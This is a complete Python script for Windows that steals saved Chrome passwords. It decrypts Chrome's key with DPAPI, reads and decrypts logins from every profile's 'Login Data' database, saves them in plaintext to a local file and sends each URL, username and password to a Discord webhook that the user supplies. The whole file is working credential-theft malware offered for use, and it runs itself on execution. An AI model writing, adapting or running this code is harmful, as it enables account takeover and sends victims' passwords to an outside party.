import os
import sqlite3
import shutil
import base64
import json
import re
import win32crypt  # Requires 'pywin32'
from Cryptodome.Cipher import AES  # Requires 'pycryptodomex'
import requests  # For sending requests to Discord webhook


def main_google():
    # Base path to Chrome User Data
    CHROME_BASE_PATH = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\"
    OUTPUT_FILE = "credentials.txt"  # File to store results

    # Path to the 'Local State' file
    LOCAL_STATE_PATH = os.path.join(CHROME_BASE_PATH, "Local State")

    # Discord webhook URL
    DISCORD_WEBHOOK_URL = " " # Put your Webhook in here | the request is already well formatted for better readability in the Discord Interface 

    def send_to_discord_webhook(content):
        """Send content to a Discord webhook."""
        data = {
            "content": content
        }
        response = requests.post(DISCORD_WEBHOOK_URL, json=data)
        return response.status_code

    def get_encryption_key():
        """Retrieve the AES encryption key used by Chrome to encrypt passwords."""
        if not os.path.exists(LOCAL_STATE_PATH):
            print("Error: Chrome 'Local State' file not found!")
            exit()

        with open(LOCAL_STATE_PATH, "r", encoding="utf-8") as file:
            local_state = json.load(file)

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Strip "DPAPI" prefix

        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]  # Decrypt AES key

    def decrypt_password(encrypted_password, key):
        """Decrypt Chrome's AES-encrypted password."""
        try:
            # Split the encrypted password into IV, ciphertext, and tag
            iv = encrypted_password[3:15]  # 12-byte IV
            ciphertext = encrypted_password[15:-16]  # Everything except IV and 16-byte tag
            tag = encrypted_password[-16:]  # Last 16 bytes are the tag

            # Decrypt using AES-GCM
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)

            # Clean up non-printable characters
            clean_password = decrypted.decode("utf-8", errors="ignore")
            clean_password = re.sub(r'[^\x20-\x7E]', '', clean_password).strip()

            return clean_password if clean_password else "[Decryption Failed]"
        
        except Exception as e:
            print(f"Error decrypting password: {e}")
            return "[Decryption Failed]"

    def extract_chrome_credentials(profile_path):
        """Extract saved logins and save to a file."""
        db_path = os.path.join(profile_path, "Login Data")
        copied_db = "chrome_login.db"

        if not os.path.exists(db_path):
            print(f"Error: Chrome 'Login Data' file not found at {db_path}!")
            return []

        # Copy the database to avoid file lock issues
        shutil.copyfile(db_path, copied_db)

        conn = sqlite3.connect(copied_db)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            key = get_encryption_key()

            credentials = []
            with open(OUTPUT_FILE, "a", encoding="utf-8") as file:
                file.write(f"Profile: {profile_path}\n")
                file.write("URL | Username | Encrypted Password (Base64) | Decrypted Password\n")
                file.write("="*80 + "\n")

                for url, username, encrypted_password in cursor.fetchall():
                    if username and encrypted_password:
                        # Convert encrypted password to Base64 for readability
                        encrypted_b64 = base64.b64encode(encrypted_password).decode("utf-8")
                        
                        # Decrypt the password
                        decrypted = decrypt_password(encrypted_password, key)
                        
                        # Write to file
                        line = f"{url} | {username} | {encrypted_b64} | {decrypted}\n"
                        file.write(line)
                        
                        # Also add to credentials list for console output
                        credentials.append(f"URL: {url} | Username: {username} | Password: {decrypted}")

                        # Send credentials to Discord webhook
                        discord_message = f"ㅤ \n**Profile: {profile_path}**\n>>> **URL:** {url}\n**Username:** {username}\n**Password:** {decrypted}"
                        send_to_discord_webhook(discord_message)

            conn.close()
            os.remove(copied_db)  # Cleanup
            return credentials

        except sqlite3.Error as e:
            print(f"Database error: {e}")
            conn.close()
            os.remove(copied_db)
            return []

    if __name__ == "__main__":
        # Clear the output file before starting
        if os.path.exists(OUTPUT_FILE):
            os.remove(OUTPUT_FILE)

        # Loop through profiles from 0 to 40
        for profile_num in range(0, 41):
            profile_path = os.path.join(CHROME_BASE_PATH, f"Profile {profile_num}")
            if os.path.exists(profile_path):
                print(f"Checking Profile {profile_num}...")
                logins = extract_chrome_credentials(profile_path)
                if logins:
                    print(f"Credentials found in Profile {profile_num}!")
                    for login in logins:
                        print(login)
                else:
                    print(f"No saved credentials found in Profile {profile_num}.")
            else:
                print(f"Profile {profile_num} does not exist.")

        print(f"Results saved to {OUTPUT_FILE}!")
        send_to_discord_webhook("\n-# ------------------------------------------------------------------------------------------------------\n-# ------------------------------------------------------------------------------------------------------")


main_google()
